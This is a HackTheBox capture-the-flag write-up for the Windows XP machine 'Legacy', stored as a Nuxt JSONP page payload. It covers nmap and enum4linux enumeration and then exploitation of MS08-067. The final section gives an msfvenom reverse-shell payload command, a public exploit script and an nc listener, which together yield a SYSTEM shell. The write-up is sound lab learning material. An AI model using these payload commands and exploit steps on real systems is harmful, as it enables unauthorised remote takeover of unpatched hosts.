__NUXT_JSONP__("/writeups/legacy-htb", (function(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G){return {data:[{article:{slug:"legacy-htb",description:"HTB Easy Machine",title:"Legacy",img:"\u002Fimages\u002Fwriteups\u002Flegacy\u002Flegacy.png",tags:["easy","windows","msfvenom","smb",t,"cve-exploit "],toc:[{id:u,depth:r,text:v},{id:w,depth:r,text:x},{id:y,depth:r,text:z}],body:{type:"root",children:[{type:b,tag:"h1",props:{id:"legacy-easy-windows"},children:[{type:b,tag:e,props:{href:"#legacy-easy-windows",ariaHidden:m,tabIndex:n},children:[{type:b,tag:o,props:{className:[p,q]},children:[]}]},{type:a,value:"Legacy #Easy #Windows"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"#nmap #msfvenom #smb #nmap #cve-exploit"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:b,tag:g,props:{},children:[{type:a,value:"IP"}]},{type:a,value:": 10.10.10.4"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:b,tag:g,props:{},children:[{type:a,value:"Start date"}]},{type:a,value:": [[2022-03-27]]\n"},{type:b,tag:g,props:{},children:[{type:a,value:"End date"}]},{type:a,value:": [[2022-03-27]]"}]},{type:a,value:c},{type:b,tag:s,props:{id:u},children:[{type:b,tag:e,props:{href:"#10-enumeration---nmap",ariaHidden:m,tabIndex:n},children:[{type:b,tag:o,props:{className:[p,q]},children:[]}]},{type:a,value:v}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"First of all we scan all the ports using "},{type:b,tag:f,props:{},children:[{type:a,value:t}]},{type:a,value:". A half-TCP scan to know which ports are open for a further scan."}]},{type:a,value:c},{type:b,tag:h,props:{className:[i]},children:[{type:b,tag:j,props:{className:[k,l]},children:[{type:b,tag:f,props:{},children:[{type:a,value:"title: `nmap -T5 -p- -n -Pn -vvv 10.10.10.10 -oG legacy.nmap`\n\n```python\nPORT     STATE  SERVICE       REASON\n139\u002Ftcp  ope****n   netbios-ssn   syn-ack\n445\u002Ftcp  open   microsoft-ds  syn-ack\n3389\u002Ftcp closed ms-wbt-server conn-refused\n\n"}]}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Now that we know which ports are open we can run a more through nmap scan on those ports"}]},{type:a,value:c},{type:b,tag:h,props:{className:[i]},children:[{type:b,tag:j,props:{className:[k,l]},children:[{type:b,tag:f,props:{},children:[{type:a,value:"title: `nmap -sCV -p139,445,3389 -n -Pn 10.10.10.4 -oG legacy_s.nmap`\n\n\nService Info: OSs: Windows, Windows XP; CPE: cpe:\u002Fo:microsoft:windows, cpe:\u002Fo:microsoft:windows_xp\n\nHost script results:\n|_clock-skew: mean: 5d00h29m47s, deviation: 2h07m16s, median: 4d22h59m47s\n|_smb2-time: Protocol negotiation failed (SMB2)\n|_nbstat: NetBIOS name: LEGACY, NetBIOS user: \u003Cunknown\u003E, NetBIOS MAC: 00:50:56:b9:cd:cd (VMware)\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb-os-discovery: \n|   OS: Windows XP (Windows 2000 LAN Manager)\n|   OS CPE: cpe:\u002Fo:microsoft:windows_xp::-\n|   Computer name: legacy\n|   NetBIOS computer name: LEGACY\\x00\n|   Workgroup: HTB\\x00\n|_  System time: 2022-04-01T15:03:30+03:00\n\n"}]}]}]},{type:a,value:c},{type:b,tag:s,props:{id:w},children:[{type:b,tag:e,props:{href:"#11-enumeration-port-139445",ariaHidden:m,tabIndex:n},children:[{type:b,tag:o,props:{className:[p,q]},children:[]}]},{type:a,value:x}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Ports 139 and 445 are commonly used for "},{type:b,tag:g,props:{},children:[{type:a,value:"samba"}]},{type:a,value:" server, and as seen in nmap, it is running smb."}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"We can check for possible vulnerabilities as the host is running an older version of Windows : "},{type:b,tag:g,props:{},children:[{type:a,value:"Windows XP"}]},{type:a,value:"."}]},{type:a,value:c},{type:b,tag:h,props:{className:[i]},children:[{type:b,tag:j,props:{className:[k,l]},children:[{type:b,tag:f,props:{},children:[{type:a,value:"title: `enum4linux -v 10.10.10.4`\ncollapse:closed\n\n```python\n                                                                                                                  │\n[V] Attempting to get Password Policy info with command: rpcclient -W 'HTB' -U''%'' '10.10.10.4' -c \"getdompwinfo\" 2\u003E&│\n[E] Failed to get password policy with rpcclient                                                                      │\n ============================                                                                                         │\n|    Groups on 10.10.10.4    |                                                                                        │\n ============================                                                                                         │\n[V] Getting builtin groups with command: rpcclient -W 'HTB' -U''%'' '10.10.10.4' -c 'enumalsgroups builtin' 2\u003E&1      │\n                                                                                                                      │\n[+] Getting builtin groups:                                                                                           │\n                                                                                                                      │\n[+] Getting builtin group memberships:                                                                                │\n[V] Getting local groups with command: rpcclient -W 'HTB' -U''%'' '10.10.10.4' -c 'enumalsgroups domain' 2\u003E&1         │\n                                                                                                                      │\n[+] Getting local groups:                                                                                             │\n                                                                                                                      │\n[+] Getting local group memberships:                                                                                  │\n[V] Getting domain groups with command: rpcclient -W 'HTB' -U''%'' '10.10.10.4' -c \"enumdomgroups\" 2\u003E&1               │\n                                                                                                                      │\n[+] Getting domain groups:                                                                                            │\n[+] Getting domain group memberships:                                                                                 │\n =====================================================================                                                │\n|    Users on 10.10.10.4 via RID cycling (RIDS: 500-550,1000-1050)    |                                               │\n =====================================================================                                                │\n[V] Attempting to get SID from 10.10.10.4 with command: rpcclient -W 'HTB' -U''%'' '10.10.10.4' -c 'lookupnames admini│\nstrator' 2\u003E&1                                                                                                         │\n[V] Assuming that user \"administrator\" exists                                                                         │\n[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                             │\n[V] Attempting to get SIDs from 10.10.10.4 with command: rpcclient -W 'HTB' -U''%'' '10.10.10.4' -c lsaenumsid 2\u003E&1   │\n                                                                                                                      │\n ===========================================                                                                          │\n|    Getting printer info for 10.10.10.4    |                                                                         │\n ===========================================                                                                          │\n[V] Attempting to get printer info with command: rpcclient -W 'HTB' -U''%'' -c 'enumprinters' '10.10.10.4' 2\u003E&1       │\nNo printers returned. \n\n"}]}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Now we can run a deeper smb scan using nmap"}]},{type:a,value:c},{type:b,tag:h,props:{className:[i]},children:[{type:b,tag:j,props:{className:[k,l]},children:[{type:b,tag:f,props:{},children:[{type:a,value:"title: `nmap --script=\"smb-vuln*\" -Pn -p139,445 10.10.10.4 `\n\n```python\nHost script results:\n| smb-vuln-ms08-067: \n|   VULNERABLE:\n|   Microsoft Windows system vulnerable to remote code execution (MS08-067)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2008-4250\n|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,\n|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary\n|           code via a crafted RPC request that triggers the overflow during path canonicalization.\n|           \n|     Disclosure date: 2008-10-23\n|     References:\n|       https:\u002F\u002Fcve.mitre.org\u002Fcgi-bin\u002Fcvename.cgi?name=CVE-2008-4250\n|_      https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fsecurity\u002Fms08-067.aspx\n|_smb-vuln-ms10-054: false\n| smb-vuln-ms17-010: \n|   VULNERABLE:\n|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)\n|     State: VULNERABLE\n|     IDs:  CVE:CVE-2017-0143\n|     Risk factor: HIGH\n|       A critical remote code execution vulnerability exists in Microsoft SMBv1\n|        servers (ms17-010).\n|           \n|     Disclosure date: 2017-03-14\n|     References:\n|       https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fsecurity\u002Fms17-010.aspx\n|       https:\u002F\u002Fcve.mitre.org\u002Fcgi-bin\u002Fcvename.cgi?name=CVE-2017-0143\n|_      https:\u002F\u002Fblogs.technet.microsoft.com\u002Fmsrc\u002F2017\u002F05\u002F12\u002Fcustomer-guidance-for-wannacrypt-attacks\u002F\n|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)\n\n\n"}]}]}]},{type:a,value:c},{type:b,tag:s,props:{id:y},children:[{type:b,tag:e,props:{href:"#20-exploitation-ms08-067",ariaHidden:m,tabIndex:n},children:[{type:b,tag:o,props:{className:[p,q]},children:[]}]},{type:a,value:z}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"Because this is vulnerable to MS08-067 which is Buffer Overflow of SMB.\nIt is a critical vulnerability in Server Service that oculd allow remote code execution.\nMore info below:\n"},{type:b,tag:e,props:{href:A,rel:[B,C,D],target:E},children:[{type:a,value:A}]}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"How to exploit it?"}]},{type:a,value:c},{type:b,tag:d,props:{},children:[{type:a,value:"By using the "},{type:b,tag:e,props:{href:F,rel:[B,C,D],target:E},children:[{type:a,value:F}]},{type:a,value:" repository we can easily exploit it."}]},{type:a,value:c},{type:b,tag:h,props:{className:[i]},children:[{type:b,tag:j,props:{className:[k,l]},children:[{type:b,tag:f,props:{},children:[{type:a,value:"title: `python2 ms08_067_2018.py 10.10.10.4 6 445`\n\nWe need to change the `shellcode` payload to one that generates a reverse shell to an specific port.\n\n`msfvenom -p windows\u002Fshell_reverse_tcp LHOST=10.10.14.13 LPORT=443 EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f c -a x86 --platform windows`\n\nNow it asks us for the versions of the windows. In this case is: `6 - Windows XP SP3 English (NX)`\n\nThen we run the script, with a `rlwrap -cAr nc -lvnp 443` on another shell and..\n\n![[admin.png]]\n\n\nThis shell has nt authority\\system privileges. \n"}]}]}]}]},dir:"\u002Fwriteups",path:"\u002Fwriteups\u002Flegacy-htb",extension:".md",createdAt:G,updatedAt:G}}],fetch:{},mutations:void 0}}("text","element","\n","p","a","code","strong","div","nuxt-content-highlight","pre","language-text","line-numbers","true",-1,"span","icon","icon-link",3,"h3","nmap","10-enumeration---nmap","1.0 Enumeration - Nmap","11-enumeration-port-139445","1.1 Enumeration Port 139\u002F445","20-exploitation-ms08-067","2.0 Exploitation MS08-067","https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fsecurity-updates\u002FSecurityBulletins\u002F2008\u002Fms08-067","nofollow","noopener","noreferrer","_blank","https:\u002F\u002Fgithub.com\u002Fandyacer\u002Fms08_067","2022-07-08T13:15:28.303Z")));